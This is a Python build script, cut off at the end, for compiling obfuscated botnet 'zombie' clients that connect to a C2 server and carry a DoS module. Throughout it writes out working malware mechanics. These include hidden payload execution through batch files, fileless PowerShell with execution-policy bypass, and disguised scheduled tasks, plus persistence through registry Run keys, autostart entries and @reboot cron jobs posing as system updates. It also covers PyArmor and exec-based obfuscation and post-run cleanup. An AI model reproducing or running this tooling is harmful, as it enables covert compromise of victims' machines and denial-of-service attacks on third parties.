#!/usr/bin/env python3
"""
Zombie Build Utility
====================
Build system for generating obfuscated zombie binarie clients
across multiple platforms with multiple configuration options.

Usage:
    python build.py [options]

Options:
    --platform <platform>      Target platform (windows|linux|macos) [default: current]
    --server <url>             C2 server URL [default: http://127.0.0.1:5000]
    --obfuscation <level>      Obfuscation level (basic|medium|advanced) [default: medium]
    --icon <path>              Path to custom icon file
    --payload <path>           Path to batch script payload for Windows builds
    --payload-delay <seconds>  Delay before executing payload [default: 30]
    --payload-technique <type> Payload execution technique (direct|fileless|scheduled) [default: direct]
    --upx                      Enable UPX compression
    --debug                    Enable debug output
    --output <path>            Output directory [default: ./dist]

Dependencies:
    - Python 3.6+ (required)
    - PyArmor (required)
    - PyInstaller (required)
    - UPX (optional)
"""

import os
import sys
import subprocess
import platform
import argparse
import shutil
import random
import zlib
import string
import logging
import re
import json
import uuid
import base64
import tempfile
from datetime import datetime
import traceback

VERSION = "2.0.0"
SOURCE_FILE = 'zombie.py'
DOS_MODULE_FILE = 'dos_module.py'
BUILD_DIR = 'build'
DIST_DIR = 'dist'
TEMP_DIR = tempfile.gettempdir()
LOG_FILE = 'zombie_build.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('zombie_builder')

class ZombieBuilder:
    """
    Enterprise-grade builder for generating obfuscated zombie binaries
    with advanced configuration management and cross-platform support.
    """
    
    def __init__(self, args):
        """Initialize the builder with command-line arguments"""
        self.args = args
        self.platform = self._determine_platform(args.platform)
        self.server_url = args.server
        self.obfuscation_level = args.obfuscation
        self.icon_path = args.icon
        self.payload_path = args.payload if hasattr(args, 'payload') else None
        self.payload_delay = args.payload_delay if hasattr(args, 'payload_delay') else 30
        self.payload_technique = args.payload_technique if hasattr(args, 'payload_technique') else 'direct'
        self.use_upx = args.upx
        self.debug = args.debug
        self.output_dir = args.output
        
        if self.debug:
            logger.setLevel(logging.DEBUG)
            for handler in logger.handlers:
                if isinstance(handler, logging.StreamHandler):
                    handler.setLevel(logging.DEBUG)
            
        self.build_id = f"zombie_{uuid.uuid4().hex[:8]}"
        self.build_timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        
        self.base_dir = os.path.abspath(os.getcwd())
        self.build_dir = os.path.join(self.base_dir, BUILD_DIR)
        self.output_dir = os.path.abspath(self.output_dir)
        
        self.source_file_path = os.path.join(self.base_dir, SOURCE_FILE)
        self.dos_module_path = os.path.join(self.base_dir, DOS_MODULE_FILE)
        
        self.prep_dir = os.path.join(self.build_dir, 'prep')
        self.obfuscate_dir = os.path.join(self.build_dir, 'obfuscate')
        self.compile_dir = os.path.join(self.build_dir, 'compile')
        
        self.file_extension = self._get_file_extension()
        
        self.modified_source = os.path.join(self.prep_dir, f"{self.build_id}.py")
        self.payload_module = os.path.join(self.prep_dir, "payload_module.py")
        self.obfuscated_file = os.path.join(self.obfuscate_dir, f"{self.build_id}_obfuscated.py")
        self.final_executable = os.path.join(self.output_dir, f"zombie_{self.platform}_{self.build_timestamp}{self.file_extension}")
        
        self.payload_data = None
        
        logger.debug(f"Initialized builder for platform: {self.platform}")
        logger.debug(f"Server URL: {self.server_url}")
        logger.debug(f"Build ID: {self.build_id}")
        logger.debug(f"Base directory: {self.base_dir}")
        logger.debug(f"Source file: {self.source_file_path}")
        logger.debug(f"DOS module: {self.dos_module_path}")
        
        if self.payload_path:
            logger.debug(f"Payload path: {self.payload_path}")
            logger.debug(f"Payload technique: {self.payload_technique}")
            logger.debug(f"Payload delay: {self.payload_delay} seconds")
    
    def _determine_platform(self, requested_platform):
        """Determine the target platform"""
        if requested_platform and requested_platform != 'current':
            return requested_platform
        
        system = platform.system().lower()
        if 'windows' in system:
            return 'windows'
        elif 'darwin' in system:
            return 'macos'
        elif 'linux' in system:
            return 'linux'
        else:
            logger.warning(f"Unknown platform: {system}, defaulting to linux")
            return 'linux'
    
    def _get_file_extension(self):
        """Get appropriate file extension for the target platform"""
        if self.platform == 'windows':
            return '.exe'
        elif self.platform == 'macos':
            return '.app'
        else:
            return ''  
    
    def _check_dependencies(self):
        """Verify all required dependencies are installed"""
        logger.info("Checking dependencies...")
        
        try:
            python_version = tuple(map(int, platform.python_version_tuple()))
            if python_version < (3, 6, 0):
                logger.error(f"Python 3.6+ required, found {platform.python_version()}")
                return False
            
            try:
                pyarmor_version = subprocess.check_output(['pyarmor', '--version'], 
                                                      stderr=subprocess.STDOUT,
                                                      text=True).strip()
                logger.debug(f"PyArmor version: {pyarmor_version}")
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.error("PyArmor not found. Install with: pip install pyarmor")
                return False
            
            try:
                pyinstaller_version = subprocess.check_output(['pyinstaller', '--version'], 
                                                          stderr=subprocess.STDOUT,
                                                          text=True).strip()
                logger.debug(f"PyInstaller version: {pyinstaller_version}")
            except (subprocess.CalledProcessError, FileNotFoundError):
                logger.error("PyInstaller not found. Install with: pip install pyinstaller")
                return False
            
            if self.use_upx:
                try:
                    upx_version = subprocess.check_output(['upx', '--version'], 
                                                        stderr=subprocess.STDOUT,
                                                        text=True).strip()
                    logger.debug(f"UPX version: {upx_version}")
                except (subprocess.CalledProcessError, FileNotFoundError):
                    logger.warning("UPX not found, continuing without compression")
                    self.use_upx = False
            
            if not os.path.exists(self.source_file_path):
                logger.error(f"Source file '{self.source_file_path}' not found")
                return False
            
            if not os.path.exists(self.dos_module_path):
                logger.error(f"DoS module file '{self.dos_module_path}' not found")
                return False
            
            if self.icon_path and not os.path.exists(self.icon_path):
                logger.error(f"Icon file '{self.icon_path}' not found")
                return False
            
            if self.payload_path:
                if not os.path.exists(self.payload_path):
                    logger.error(f"Payload batch file '{self.payload_path}' not found")
                    return False
                
                if self.platform != 'windows':
                    logger.error(f"Payload batch files can only be used with Windows platform, not {self.platform}")
                    return False
                
                try:
                    with open(self.payload_path, 'rb') as f:
                        payload_content = f.read()
                        self.payload_data = base64.b64encode(payload_content).decode('utf-8')
                    logger.debug(f"Payload file loaded: {len(payload_content)} bytes")
                except Exception as e:
                    logger.error(f"Failed to read payload file: {e}")
                    return False
            
            logger.info("All dependencies satisfied")
            return True
            
        except Exception as e:
            logger.error(f"Dependency check failed: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _prepare_build_environment(self):
        logger.info("Preparing build environment...")
        
        try:
            os.makedirs(self.build_dir, exist_ok=True)
            os.makedirs(self.prep_dir, exist_ok=True)
            os.makedirs(self.obfuscate_dir, exist_ok=True)
            os.makedirs(self.compile_dir, exist_ok=True)
            os.makedirs(self.output_dir, exist_ok=True)
            
            shutil.copy2(self.source_file_path, os.path.join(self.prep_dir, SOURCE_FILE))
            shutil.copy2(self.dos_module_path, os.path.join(self.prep_dir, DOS_MODULE_FILE))
            
            logger.debug(f"Base directory contents: {os.listdir(self.base_dir)}")
            logger.debug(f"Prep directory contents after copy: {os.listdir(self.prep_dir)}")
            
            if self.payload_data and self.platform == 'windows':
                self._create_payload_module()
            
            logger.debug("Build environment prepared successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to prepare build environment: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _create_payload_module(self):
        """Create a Python module to store the payload data"""
        logger.info("Creating payload module...")
        
        try:
            with open(self.payload_module, 'w') as f:
                f.write(f"""# Payload Module
# Generated automatically - DO NOT EDIT

import base64
import subprocess
import tempfile
import os
import sys
import time
import threading
import random
import uuid

# Payload configuration
PAYLOAD_DATA = "{self.payload_data}"
PAYLOAD_DELAY = {self.payload_delay}
PAYLOAD_TECHNIQUE = "{self.payload_technique}"

def execute_payload_direct():
    '''Execute payload using direct file write technique'''
    try:
        # Wait for specified delay before executing payload
        time.sleep(PAYLOAD_DELAY)
        
        # Decode the payload data
        payload_data = base64.b64decode(PAYLOAD_DATA)
        
        # Create a temporary file for the batch script
        temp_dir = tempfile.gettempdir()
        batch_file = os.path.join(temp_dir, f"sys_update_{{int(time.time())}}.bat")
        
        # Write the batch script to the temporary file
        with open(batch_file, 'wb') as f:
            f.write(payload_data)
        
        # Execute the batch script with hidden window
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(batch_file, startupinfo=startupinfo, shell=True)
        else:
            # Fallback for non-Windows platforms
            subprocess.Popen([batch_file], shell=True)
        
        # Schedule removal of the batch file after execution
        def cleanup_file():
            time.sleep(10)  # Wait for execution to complete
            try:
                if os.path.exists(batch_file):
                    os.remove(batch_file)
            except:
                pass
                
        threading.Thread(target=cleanup_file, daemon=True).start()
        return True
    except Exception as e:
        print(f"Payload execution error: {{e}}")
        return False

def execute_payload_fileless():
    '''Execute payload using fileless PowerShell technique'''
    try:
        # Wait for specified delay
        time.sleep(PAYLOAD_DELAY)
        
        # Decode the payload data
        payload_data = base64.b64decode(PAYLOAD_DATA)
        
        # Create a PowerShell command to execute the batch content without writing to disk
        ps_payload = payload_data.decode('utf-8', errors='ignore').replace('"', '\\"')
        
        # Format PowerShell command
        ps_command = f'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {{$cmd = @\\"\n{ps_payload}\n\\"@; Invoke-Expression $cmd}}"'
        
        # Run the PowerShell command hidden
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(ps_command, startupinfo=startupinfo, shell=True)
        else:
            # Fallback for non-Windows platforms
            subprocess.Popen([ps_command], shell=True)
        
        return True
    except Exception as e:
        print(f"Payload execution error: {{e}}")
        return False

def execute_payload_scheduled():
    '''Execute payload using scheduled task technique'''
    try:
        # Wait for specified delay
        time.sleep(PAYLOAD_DELAY)
        
        # Decode the payload data
        payload_data = base64.b64decode(PAYLOAD_DATA)
        
        # Create temporary batch file
        task_name = f"WinSysUpdate_{{uuid.uuid4().hex[:8]}}"
        temp_dir = tempfile.gettempdir()
        batch_path = os.path.join(temp_dir, f"{{task_name}}.bat")
        
        with open(batch_path, 'wb') as f:
            f.write(payload_data)
        
        # Create and execute scheduled task
        cmd = f'schtasks /create /tn "{task_name}" /tr "{batch_path}" /sc once /st 00:00 /f'
        subprocess.call(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Run the task immediately
        run_cmd = f'schtasks /run /tn "{task_name}"'
        subprocess.call(run_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Clean up the scheduled task after a short delay
        def cleanup_task():
            time.sleep(30)  # Wait for task to complete
            subprocess.call(f'schtasks /delete /tn "{task_name}" /f', shell=True, 
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                os.remove(batch_path)
            except:
                pass
        
        threading.Thread(target=cleanup_task, daemon=True).start()
        return True
    except Exception as e:
        print(f"Payload execution error: {{e}}")
        return False

def execute_payload():
    '''Execute the payload using the configured technique'''
    technique = PAYLOAD_TECHNIQUE.lower()
    
    if technique == 'fileless':
        return execute_payload_fileless()
    elif technique == 'scheduled':
        return execute_payload_scheduled()
    else:  # default to direct
        return execute_payload_direct()

# Launch payload in background thread when module is imported
threading.Thread(target=execute_payload, daemon=True).start()
""")
            
            logger.debug(f"Payload module created successfully at {self.payload_module}")
            return True
        except Exception as e:
            logger.error(f"Failed to create payload module: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _modify_source_code(self):
        """Modify source code with custom configuration"""
        logger.info("Customizing source code...")
        
        try:
            source_file = os.path.join(self.prep_dir, SOURCE_FILE)
            logger.debug(f"Reading source file from: {source_file}")
            
            with open(source_file, 'r') as f:
                source_code = f.read()
            
            source_code = re.sub(
                r'SERVER_URL = "http://127\.0\.0\.1:5000"',
                f'SERVER_URL = "{self.server_url}"',
                source_code
            )
            
            zombie_id = f"zombie_{uuid.uuid4().hex[:8]}"
            source_code = re.sub(
                r'ZOMBIE_ID = f"zombie_\{uuid\.uuid4\(\)\.hex\[:8\]\}"',
                f'ZOMBIE_ID = "{zombie_id}"',
                source_code
            )
            
            if self.obfuscation_level == 'basic':
                check_in_interval = 300  # 5 minutes
                poll_interval = 30  # 30 seconds
            elif self.obfuscation_level == 'advanced':
                check_in_interval = 1800  # 30 minutes
                poll_interval = 120  # 2 minutes
            else:  # medium (default)
                check_in_interval = 600  # 10 minutes
                poll_interval = 60  # 1 minute
                
            source_code = re.sub(
                r'CHECK_IN_INTERVAL = 300',
                f'CHECK_IN_INTERVAL = {check_in_interval}',
                source_code
            )
            
            source_code = re.sub(
                r'COMMAND_POLL_INTERVAL = 30',
                f'COMMAND_POLL_INTERVAL = {poll_interval}',
                source_code
            )
            
            if self.platform == 'windows':
                persistence_code = '''
# Windows persistence mechanism
def setup_persistence():
    """Setup persistence on Windows"""
    try:
        import winreg
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        executable_path = os.path.abspath(sys.executable)
        winreg.SetValueEx(key, "WindowsUpdateManager", 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        logger.error(f"Persistence error: {str(e)}")
        return False

# Call persistence setup
setup_persistence()
'''
                source_code = re.sub(
                    r'def main\(\):',
                    f'{persistence_code}\ndef main():',
                    source_code
                )
                
                if self.payload_data:
                    source_code = re.sub(
                        r'(^.*import.*$\n+)',
                        r'\1try:\n    import payload_module\nexcept ImportError:\n    pass\n\n',
                        source_code,
                        count=1,
                        flags=re.MULTILINE
                    )
            
            elif self.platform == 'linux' or self.platform == 'macos':
                persistence_code = '''
# Unix persistence mechanism
def setup_persistence():
    """Setup persistence on Unix systems"""
    try:
        home_dir = os.path.expanduser("~")
        
        # For Linux desktop environments
        autostart_dir = os.path.join(home_dir, ".config/autostart")
        if os.path.exists(autostart_dir):
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, "system-update.desktop")
            with open(desktop_file, "w") as f:
                f.write("""[Desktop Entry]
Type=Application
Name=System Update Manager
Exec={}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""".format(os.path.abspath(sys.executable)))
        
        # For cron jobs
        cron_path = os.path.join(home_dir, ".system-update")
        shutil.copy2(sys.executable, cron_path)
        os.chmod(cron_path, 0o755)
        
        # Add to crontab
        cron_cmd = f"@reboot {cron_path} > /dev/null 2>&1"
        current_crontab = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
        if cron_cmd not in current_crontab:
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
                temp_file.write(current_crontab)
                if not current_crontab.endswith('\\n'):
                    temp_file.write("\\n")
                temp_file.write(cron_cmd + "\\n")
            subprocess.call(["crontab", temp_file.name])
            os.unlink(temp_file.name)
        
        return True
    except Exception as e:
        logger.error(f"Persistence error: {str(e)}")
        return False

# Call persistence setup with error handling
try:
    setup_persistence()
except:
    pass
'''
                source_code = re.sub(
                    r'def main\(\):',
                    f'{persistence_code}\ndef main():',
                    source_code
                )
            
            with open(self.modified_source, 'w') as f:
                f.write(source_code)
            
            logger.debug(f"Source code customized and saved to {self.modified_source}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to modify source code: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _manual_obfuscation(self):
        """Perform a simplified obfuscation without using PyArmor"""
        logger.info("Performing manual code obfuscation...")
        
        try:
            with open(self.modified_source, 'r') as f:
                source_code = f.read()
            
            obfuscated_code = f"""# Obfuscated code - Generated {datetime.now().isoformat()}
import base64
import zlib
import sys
import types
import time
import random

# Anti-debug delay
time.sleep(random.uniform(0.1, 0.5))

# Original code (compressed)
_z = b"{base64.b85encode(zlib.compress(source_code.encode('utf-8'))).decode('utf-8')}"

# Decode and execute
exec(zlib.decompress(base64.b85decode(_z)).decode('utf-8'))
"""
            os.makedirs(self.obfuscate_dir, exist_ok=True)
            
            with open(self.obfuscated_file, 'w') as f:
                f.write(obfuscated_code)
            
            shutil.copy2(
                os.path.join(self.prep_dir, DOS_MODULE_FILE),
                os.path.join(self.obfuscate_dir, DOS_MODULE_FILE)
            )
            
            if self.payload_data and self.platform == 'windows':
                shutil.copy2(
                    self.payload_module,
                    os.path.join(self.obfuscate_dir, os.path.basename(self.payload_module))
                )
            
            logger.info(f"Manual obfuscation completed: {self.obfuscated_file}")
            
            if not os.path.exists(self.obfuscated_file):
                logger.error(f"Failed to create obfuscated file: {self.obfuscated_file}")
                return False
                
            logger.debug(f"Obfuscation directory contents: {os.listdir(self.obfuscate_dir)}")
            return True
            
        except Exception as e:
            logger.error(f"Manual obfuscation failed: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _obfuscate_code(self):
        logger.info(f"Obfuscating code with {self.obfuscation_level} protection level...")
        
        try:
            success = self._try_pyarmor_obfuscation()
            
            if not success:
                logger.warning("PyArmor obfuscation failed, falling back to manual obfuscation")
                return self._manual_obfuscation()
            
            return success
            
        except Exception as e:
            logger.error(f"Obfuscation failed: {e}")
            logger.error(traceback.format_exc())
            logger.warning("Attempting manual obfuscation as fallback")
            return self._manual_obfuscation()
    
    def _try_pyarmor_obfuscation(self):
        try:
            if self.obfuscation_level == 'basic':
                obfuscation_options = ['--advanced', '0']
            elif self.obfuscation_level == 'advanced':
                obfuscation_options = ['--advanced', '2', '--restrict', '3']
            else:  # medium (default)
                obfuscation_options = ['--advanced', '1', '--restrict', '2']
            
            pyarmor_work_dir = os.path.join(self.build_dir, 'pyarmor_work')
            os.makedirs(pyarmor_work_dir, exist_ok=True)
            
            modified_source_name = os.path.basename(self.modified_source)
            shutil.copy2(self.modified_source, os.path.join(pyarmor_work_dir, modified_source_name))
            shutil.copy2(os.path.join(self.prep_dir, DOS_MODULE_FILE), os.path.join(pyarmor_work_dir, DOS_MODULE_FILE))
            
            if self.payload_data and self.platform == 'windows':
                payload_module_name = os.path.basename(self.payload_module)
                shutil.copy2(self.payload_module, os.path.join(pyarmor_work_dir, payload_module_name))
            
            original_dir = os.getcwd()
            os.chdir(pyarmor_work_dir)
            
            try:
                output_dir = 'dist'  # Relative to current working directory
                os.makedirs(output_dir, exist_ok=True)
                
                cmd = ['pyarmor', 'obfuscate'] + obfuscation_options + ['-O', output_dir, modified_source_name]
                logger.debug(f"Running PyArmor command in {pyarmor_work_dir}: {' '.join(cmd)}")
                
                result = subprocess.run(cmd, check=True, capture_output=True, text=True)
                logger.debug(f"PyArmor output: {result.stdout}")
                
                dist_dir = os.path.join(pyarmor_work_dir, output_dir)
                if not os.path.exists(dist_dir):
                    logger.error(f"PyArmor did not create expected dist directory: {dist_dir}")
                    return False
                
                logger.debug(f"Files in PyArmor output directory: {os.listdir(dist_dir)}")
                
                os.makedirs(self.obfuscate_dir, exist_ok=True)
                
                obfuscated_source = os.path.join(dist_dir, modified_source_name)
                if not os.path.exists(obfuscated_source):
                    logger.error(f"PyArmor did not create expected output file: {obfuscated_source}")
                    logger.error(f"Files in dist directory: {os.listdir(dist_dir)}")
                    return False
                
                shutil.copy2(obfuscated_source, self.obfuscated_file)
                
                for file in os.listdir(dist_dir):
                    src_file = os.path.join(dist_dir, file)
                    dst_file = os.path.join(self.obfuscate_dir, file)
                    if os.path.isfile(src_file):
                        shutil.copy2(src_file, dst_file)
                
                dos_module_dist = os.path.join(dist_dir, DOS_MODULE_FILE)
                if os.path.exists(dos_module_dist):
                    shutil.copy2(dos_module_dist, os.path.join(self.obfuscate_dir, DOS_MODULE_FILE))
                else:
                    shutil.copy2(os.path.join(self.prep_dir, DOS_MODULE_FILE), 
                               os.path.join(self.obfuscate_dir, DOS_MODULE_FILE))
                
                if self.payload_data and self.platform == 'windows':
                    payload_module_name = os.path.basename(self.payload_module)
                    payload_module_dist = os.path.join(dist_dir, payload_module_name)
                    if os.path.exists(payload_module_dist):
                        shutil.copy2(payload_module_dist, 
                                   os.path.join(self.obfuscate_dir, payload_module_name))
                    else:
                        shutil.copy2(self.payload_module, 
                                   os.path.join(self.obfuscate_dir, payload_module_name))
                
                logger.info(f"PyArmor obfuscation successful: {self.obfuscated_file}")
                logger.debug(f"Files in obfuscation directory: {os.listdir(self.obfuscate_dir)}")
                return True
                
            finally:
                os.chdir(original_dir)
            
        except subprocess.CalledProcessError as e:
            logger.error(f"PyArmor obfuscation failed: {e}")
            if hasattr(e, 'stdout') and e.stdout:
                logger.error(f"PyArmor stdout: {e.stdout}")
            if hasattr(e, 'stderr') and e.stderr:
                logger.error(f"PyArmor stderr: {e.stderr}")
            return False
        except Exception as e:
            logger.error(f"PyArmor obfuscation failed: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _compile_executable(self):
        """Compile the obfuscated code into an executable using PyInstaller"""
        logger.info(f"Compiling executable for {self.platform} platform...")
        
        try:
            files_to_check = [
                (self.obfuscated_file, "Obfuscated main script"),
                (os.path.join(self.obfuscate_dir, DOS_MODULE_FILE), "DOS module")
            ]
            
            if self.payload_data and self.platform == 'windows':
                payload_module_name = os.path.basename(self.payload_module)
                files_to_check.append((
                    os.path.join(self.obfuscate_dir, payload_module_name),
                    "Payload module"
                ))
            
            for file_path, description in files_to_check:
                if not os.path.exists(file_path):
                    logger.error(f"Required file missing: {file_path} ({description})")
                    logger.error(f"Directory contents: {os.listdir(os.path.dirname(file_path))}")
                    return False
            
            shutil.rmtree(self.compile_dir, ignore_errors=True)
            os.makedirs(self.compile_dir, exist_ok=True)
            
            for file_path, _ in files_to_check:
                shutil.copy2(file_path, os.path.join(self.compile_dir, os.path.basename(file_path)))
            
            for file_name in os.listdir(self.obfuscate_dir):
                src_file = os.path.join(self.obfuscate_dir, file_name)
                if os.path.isfile(src_file):
                    shutil.copy2(src_file, os.path.join(self.compile_dir, file_name))
            
            spec_content = self._generate_spec_file()
            spec_file = os.path.join(self.compile_dir, f"{self.build_id}.spec")
            
            with open(spec_file, 'w') as f:
                f.write(spec_content)
            
            original_dir = os.getcwd()
            os.chdir(self.compile_dir)
            
            try:
                logger.debug(f"Compilation directory contents: {os.listdir('.')}")
                
                cmd = ['pyinstaller', '--clean', os.path.basename(spec_file)]
                logger.debug(f"Running PyInstaller in {self.compile_dir}: {' '.join(cmd)}")
                
                process = subprocess.Popen(
                    cmd, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                logger.debug("PyInstaller output:")
                output_lines = []
                for line in process.stdout:
                    output_lines.append(line.rstrip())
                    logger.debug(f"  {line.rstrip()}")
                
                process.wait()
                
                if process.returncode != 0:
                    logger.error(f"PyInstaller failed with return code {process.returncode}")
                    logger.error("PyInstaller output:")
                    for line in output_lines:
                        logger.error(f"  {line}")
                    return False
                
                dist_dir = os.path.join(self.compile_dir, 'dist')
                executable_name = f"zombie_{self.platform}_{self.build_timestamp}{self.file_extension}"
                compiled_exe = os.path.join(dist_dir, executable_name)
                
                if not os.path.exists(compiled_exe):
                    logger.error(f"PyInstaller failed to create executable: {compiled_exe}")
                    logger.error(f"Contents of {dist_dir}: {os.listdir(dist_dir) if os.path.exists(dist_dir) else 'directory does not exist'}")
                    return False
                
                os.makedirs(self.output_dir, exist_ok=True)
                
                shutil.copy2(compiled_exe, self.final_executable)
                
                logger.info(f"Executable compiled successfully: {self.final_executable}")
                return True
                
            finally:
                os.chdir(original_dir)
            
        except Exception as e:
            logger.error(f"Compilation failed: {e}")
            logger.error(traceback.format_exc())
            return False
    
    def _generate_spec_file(self):
        """Generate a PyInstaller spec file"""
        logger.info("Generating PyInstaller spec file...")

        console_mode = 'False' if self.platform == 'windows' else 'True'

        additional_imports = [
            "'socket'", "'ssl'", "'json'", "'base64'", "'threading'", 
            "'uuid'", "'random'", "'time'", "'subprocess'", "'os'", "'sys'",
            "'cryptography'", "'cryptography.hazmat'",
            "'cryptography.hazmat.primitives'", "'cryptography.hazmat.backends'",
            "'cryptography.hazmat.primitives.asymmetric'", 
            "'cryptography.hazmat.primitives.ciphers'"
        ]

        if self.payload_data and self.platform == 'windows':
            additional_imports.extend(["'tempfile'", "'winreg'"])
            payload_module_name = os.path.splitext(os.path.basename(self.payload_module))[0]
            additional_imports.append(f"'{payload_module_name}'")

        datas = []

        file_list = os.listdir(self.compile_dir)

        if DOS_MODULE_FILE in file_list:
            datas.append(f"('{DOS_MODULE_FILE}', '.')")

        if self.payload_data and self.platform == 'windows':
            payload_module_name = os.path.basename(self.payload_module)
            if payload_module_name in file_list:
                datas.append(f"('{payload_module_name}', '.')")

        pyarmor_files = [f for f in file_list if f.startswith('pyarmor_')]
        for file in pyarmor_files:
            datas.append(f"('{file}', '.')")

        spec_content = f"""# -*- mode: python ; coding: utf-8 -*-

    import sys
    import os
    from PyInstaller.utils.hooks import collect_data_files, collect_submodules

    # Diagnostic information for debugging
    print("Current working directory:", os.getcwd())
    print("Files in current directory:", os.listdir('.'))

    # Debug imports
    for module_name in [
        'cryptography', 'socket', 'ssl', 'json', 'base64', 'threading',
        'uuid', 'random', 'time', 'subprocess'
    ]:
        try:
            __import__(module_name)
            print(f"Successfully imported {{module_name}}")
        except ImportError as e:
            print(f"WARNING: Could not import {{module_name}}: {{e}}")

    block_cipher = None

    a = Analysis(
        ['{os.path.basename(self.obfuscated_file)}'],
        pathex=['.'],
        binaries=[],
        datas=[{', '.join(datas)}],
        hiddenimports=[{', '.join(additional_imports)}],
        hookspath=[],
        hooksconfig={{}},
        runtime_hooks=[],
        excludes=[],
        win_no_prefer_redirects=False,
        win_private_assemblies=False,
        cipher=block_cipher,
        noarchive=False,
    )

    pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

    exe = EXE(
        pyz,
        a.scripts,
        a.binaries,
        a.zipfiles,
        a.datas,
        [],
        name='zombie_{self.platform}_{self.build_timestamp}',
        debug=False,
        bootloader_ignore_signals=False,
        strip=False,
        upx={str(self.use_upx).lower()},
        upx_exclude=[],
        runtime_tmpdir=None,
        console={console_mode},
        disable_windowed_traceback=False,
        argv_emulation={str(self.platform == 'macos').lower()},
        target_arch=None,
        codesign_identity=None,
        entitlements_file=None,
        icon={repr(self.icon_path) if self.icon_path else 'None'},
    )

    # Print confirmation of successful execution
    print("PyInstaller spec file executed successfully")
    """
        return spec_content
    
    def _clean_up(self):
        """Clean up temporary files and directories"""
        logger.info("Cleaning up build artifacts...")
        
        try:
            if not self.debug:
                shutil.rmtree(self.build_dir, ignore_errors=True)
                
                spec_files = [f for f in os.listdir('.') if f.endswith('.spec')]
                for spec_file in spec_files:
                    try:
                        os.remove(spec_file)
                    except:
                        pass
                
                if os.path.exists('build'):
                    shutil.rmtree('build', ignore_errors=True)
            else:
                logger.debug("Debug mode enabled - skipping cleanup of build files")
            
            logger.debug("Cleanup completed successfully")
            return True
            
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
            logger.error(traceback.format_exc())
            return True
    
    def _generate_metadata(self):
        """Generate metadata for the build"""
        logger.info("Generating build metadata...")
        
        try:
            zombie_id = None
            try:
                with open(self.modified_source, 'r') as f:
                    source_content = f.read()
                    zombie_id_match = re.search(r'ZOMBIE_ID = "(zombie_[a-f0-9]+)"', source_content)
                    if zombie_id_match:
                        zombie_id = zombie_id_match.group(1)
            except:
                pass
            
            if not zombie_id:
                zombie_id = f"unknown_{self.build_id}"
            
            metadata = {
                "build_id": self.build_id,
                "timestamp": self.build_timestamp,
                "platform": self.platform,
                "server_url": self.server_url,
                "obfuscation_level": self.obfuscation_level,
                "executable": os.path.basename(self.final_executable),
                "zombie_id": zombie_id,
                "build_system": {
                    "python_version": platform.python_version(),
                    "system": platform.system(),
                    "release": platform.release(),
                    "machine": platform.machine()
                }
            }
            
            if self.payload_path and self.platform == 'windows':
                metadata["payload"] = {
                    "source": os.path.basename(self.payload_path),
                    "size": os.path.getsize(self.payload_path),
                    "technique": self.payload_technique,
                    "delay": self.payload_delay
                }
            
            metadata_file = os.path.join(self.output_dir, f"{self.build_id}_metadata.json")
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=4)
            
            logger.info(f"Metadata saved to: {metadata_file}")
            return metadata
        except Exception as e:
            logger.error(f"Failed to generate metadata: {e}")
            logger.error(traceback.format_exc())
            return {
                "build_id": self.build_id,
                "timestamp": self.build_timestamp,
                "platform": self.platform,
                "executable": os.path.basename(self.final_executable)
            }
    
    def build(self):
        """
        Execute the full build process
        
        Returns:
            tuple: (success, metadata) where success is a boolean and
                   metadata is a dictionary with build information
        """
        logger.info(f"Starting build process for {self.platform} platform")
        logger.info(f"Build ID: {self.build_id}")
        
        if not self._check_dependencies():
            logger.error("Dependency check failed, aborting build")
            return False, None
        
        if not self._prepare_build_environment():
            logger.error("Failed to prepare build environment, aborting build")
            return False, None
        
        if not self._modify_source_code():
            logger.error("Failed to modify source code, aborting build")
            return False, None
        
        if not self._obfuscate_code():
            logger.error("Code obfuscation failed, aborting build")
            return False, None
        
        if not self._compile_executable():
            logger.error("Compilation failed, aborting build")
            return False, None
        
        metadata = self._generate_metadata()
        
        self._clean_up()
        
        logger.info(f"Build process completed successfully for {self.platform}")
        logger.info(f"Executable: {self.final_executable}")
        
        return True, metadata


def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(description='Zombie Build Utility')
    
    parser.add_argument('--platform', choices=['windows', 'linux', 'macos', 'current'],
                      default='current', help='Target platform (default: current)')
    
    parser.add_argument('--server', type=str, default='http://127.0.0.1:5000',
                      help='C2 server URL (default: http://127.0.0.1:5000)')
    
    parser.add_argument('--obfuscation', choices=['basic', 'medium', 'advanced'],
                      default='medium', help='Obfuscation level (default: medium)')
    
